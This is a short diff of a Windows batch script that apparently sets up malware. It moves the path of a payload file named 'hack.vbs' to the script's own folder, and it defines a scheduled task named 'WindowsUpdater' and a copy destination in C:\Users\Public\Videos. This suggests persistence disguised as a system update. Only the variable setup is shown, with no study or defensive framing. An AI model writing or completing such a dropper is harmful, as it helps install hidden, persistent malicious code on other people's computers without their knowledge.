@@ -1,5 +1,5 @@
 @echo off
-set payloadPath=C:\Users\Public\Videos\hack.vbs
+set payloadPath=%~dp0hack.vbs  :: The payload is located in the same folder as the batch script
 set taskName=WindowsUpdater
 set sourceFolder=%~dp0    :: Get the folder where the batch file is located
 set destinationFolder=C:\Users\Public\Videos
